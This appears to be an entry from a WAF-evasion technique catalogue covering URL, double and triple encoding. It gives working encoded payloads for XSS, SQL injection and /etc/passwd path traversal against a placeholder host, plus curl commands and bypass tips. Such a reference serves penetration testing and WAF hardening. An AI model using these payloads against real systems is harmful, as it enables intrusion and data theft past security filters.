---
id: WAF-EVASION-04
title: URL Encoding & Double Encoding
category: Evasion Techniques
severity_range: Low-Medium
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-04: URL Encoding & Double Encoding

## Summary

URL encoding (percent-encoding) is a standard mechanism for encoding special characters in URLs. WAF evasion exploits differences in how layers of the application stack decode URL-encoded data. If a WAF decodes input once but the backend decodes it again (double decoding), double-encoded payloads can bypass the WAF and still execute in the target.

## When to Use

- Against WAFs placed behind reverse proxies that perform partial decoding
- When the backend application or server performs additional URL decoding (e.g., IIS, Apache mod_rewrite)
- Against WAFs that decode input once but the web server passes through encoded characters
- When the WAF has decoding bugs or inconsistencies with RFC 3986

## Technique Details

**Single URL encoding** replaces reserved/unsafe characters with `%XX` hex representations. The WAF may fail to decode these before pattern matching, or the decoded form may be processed differently by the backend.

**Double URL encoding** encodes the `%` character itself as `%25`, resulting in `%253C` instead of `%3C`. If the WAF decodes once (producing `%3C`) but the backend server decodes again (producing `<`), the payload bypasses the WAF.

The technique is most effective against layered architectures:

```
Client -> %253Cscript%253E
  -> CDN/WAF (decodes once) -> %3Cscript%3E (not matched as <script>)
    -> Web Server (decodes again) -> <script> (executed)
```

## Payload Examples

```http
# Single URL encoding
GET /search?q=%3CsvG%2Fx%3Donload%3Dalert(1)%3E HTTP/1.1
Host: target.com

# Double URL encoding
GET /search?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E HTTP/1.1
Host: target.com

# Triple URL encoding
GET /search?q=%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E HTTP/1.1
Host: target.com

# Encoded SQL injection
GET /search?q=1%27%20%4F%52%20%31%3D%31%20--%20 HTTP/1.1
Host: target.com
# Decodes to: 1' OR 1=1 --

# Encoded path traversal
GET /file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: target.com
# Decodes to: ../../../etc/passwd
```

```bash
# curl with URL-encoded payload
curl -s "https://target.com/?q=%3C%73%63%72%69%70%74%3Ealert(1)%3C%2F%73%63%72%69%70%74%3E"

# Double-encoded payload via curl (--data-urlencode)
curl -s --data-urlencode "q=<script>alert(1)</script>" "https://target.com/"
```

## Detection & Bypass Notes

**Detection:**
- WAFs that normalize input through full RFC 3986 decoding before inspection are immune to single encoding.
- Double decoding vulnerabilities require the WAF to decode once and the backend to decode again — chained proxies are the primary attack surface.
- Some WAFs perform recursive decoding until no percent-encoding remains, defeating double encoding.

**Bypass:**
- Test single, double, and triple encoding in sequence to find the optimal decoding depth.
- Combine with other obfuscation: `%253CsvG%253E` (double-encoded case-toggled payload).
- Use mixed encoding within a single payload (some characters encoded, some not).
- Consider non-standard encodings like UTF-8 overlong sequences for edge cases.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://tools.ietf.org/html/rfc3986
- https://owasp.org/www-community/attacks/Double_Encoding
